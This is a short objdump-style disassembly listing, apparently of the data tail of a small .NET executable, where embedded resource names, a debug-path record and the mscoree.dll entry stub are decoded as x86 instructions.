  4508ab:	jns    0x450920
  4508ad:	je     0x450914
  4508af:	ins    DWORD PTR es:[edi],dx
  4508b0:	cs push edx
  4508b2:	gs jae 0x450924
  4508b5:	jne    0x450929
  4508b7:	arpl   WORD PTR [ebp+0x73],sp
  4508ba:	cs push edx
  4508bc:	jne    0x45092c
  4508be:	je     0x450929
  4508c0:	ins    DWORD PTR es:[edi],dx
  4508c1:	gs push edx
  4508c3:	gs jae 0x450935
  4508c6:	jne    0x45093a
  4508c8:	arpl   WORD PTR [ebp+0x53],sp
  4508cb:	gs je  0x4508d0
	...
  4508d6:	add    BYTE PTR [eax],al
  4508d8:	add    BYTE PTR [eax+0x41],dl
  4508db:	inc    esp
  4508dc:	push   eax
  4508dd:	inc    ecx
  4508de:	inc    esp
  4508df:	push   eax
  4508e0:	mov    ah,0x0
  4508e2:	add    BYTE PTR [eax],al
  4508e4:	add    BYTE PTR [eax],al
  4508e6:	add    BYTE PTR [eax],al
  4508e8:	js     0x4508c7
  4508ea:	loopne 0x450942
  4508ec:	add    BYTE PTR [eax],al
  4508ee:	add    BYTE PTR [eax],al
  4508f0:	add    al,BYTE PTR [eax]
  4508f2:	add    BYTE PTR [eax],al
  4508f4:	dec    ebx
  4508f5:	add    BYTE PTR [eax],al
  4508f7:	add    BYTE PTR [eax],al
  4508f9:	or     DWORD PTR ds:0x4eb0000,eax
  4508ff:	add    BYTE PTR [edx+0x53],dl
  450902:	inc    esp
  450903:	push   ebx
  450904:	shl    BYTE PTR [esi+0x1e5283f8],cl
  45090a:	jno    0x45095b
  45090c:	mov    esi,0xec2c4f01
  450911:	pop    esi
  450912:	adc    al,0x1
  450914:	add    DWORD PTR [eax],eax
  450916:	add    BYTE PTR [eax],al
  450918:	inc    esp
  450919:	cmp    bl,BYTE PTR [eax+edx*2+0x72]
  45091d:	outs   dx,DWORD PTR ds:[esi]
  45091e:	push   0x65
  450920:	arpl   WORD PTR [ebx+esi*2+0x5c],si
  450924:	inc    edi
  450925:	inc    esp
  450926:	pop    esp
  450927:	je     0x450998
  450929:	outs   dx,DWORD PTR ds:[esi]
  45092a:	ins    BYTE PTR es:[edi],dx
  45092b:	jae    0x450989
  45092d:	push   edx
  45092e:	gs jo  0x450992
  450931:	imul   esi,DWORD PTR [edx+0x5c],0x5c6a626f
  450938:	push   edx
  450939:	gs ins BYTE PTR es:[edi],dx
  45093b:	gs popa 
  45093d:	jae    0x4509a4
  45093f:	pop    esp
  450940:	push   edx
  450941:	gs jo  0x4509a5
  450944:	imul   esi,DWORD PTR [edx+0x2e],0x626470
  45094b:	jae    0x450956
  45094d:	add    eax,0x0
  450952:	add    BYTE PTR [eax],al
  450954:	add    BYTE PTR [eax],al
  450956:	add    BYTE PTR [ebp+0x509],cl
  45095c:	and    BYTE PTR [eax],al
	...
  450972:	add    BYTE PTR [edi+0x9],bh
  450975:	add    eax,0x0
  45097a:	add    BYTE PTR [eax],al
  45097c:	add    BYTE PTR [eax],al
  45097e:	add    BYTE PTR [eax],al
  450980:	add    BYTE PTR [edi+0x43],bl
  450983:	outs   dx,DWORD PTR ds:[esi]
  450984:	jb     0x4509cb
  450986:	js     0x4509ed
  450988:	dec    ebp
  450989:	popa   
  45098a:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  450991:	jb     0x4509f8
  450993:	gs cs fs ins BYTE PTR es:[edi],dx
  450997:	ins    BYTE PTR es:[edi],dx
  450998:	add    BYTE PTR [eax],al
  45099a:	add    BYTE PTR [eax],al
  45099c:	add    BYTE PTR [eax],al
  45099e:	jmp    DWORD PTR ds:0x402000
